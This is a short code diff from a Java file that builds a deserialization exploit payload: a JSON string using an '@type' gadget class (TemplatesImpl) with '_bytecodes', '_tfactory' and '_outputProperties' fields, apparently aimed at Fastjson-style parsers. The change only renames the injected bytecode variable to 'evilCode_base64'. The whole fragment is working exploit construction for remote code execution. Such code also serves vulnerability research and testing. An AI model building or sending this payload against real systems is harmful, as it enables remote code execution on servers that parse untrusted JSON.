@@ -38,7 +38,7 @@ public class TemplatesImpl {
         String payload =
                 "{\"" +
                         "@type\":\"" + NASTY_CLASS + "\"," + "\"" +
-                        "_bytecodes\":[\"" + TemplatesImplPayload + "\"]," +
+                        "_bytecodes\":[\"" + evilCode_base64 + "\"]," +
                         "'_name':'asd','" +
                         "_tfactory':{ },\"" +
                         "_outputProperties\":{ }," + "\"" +
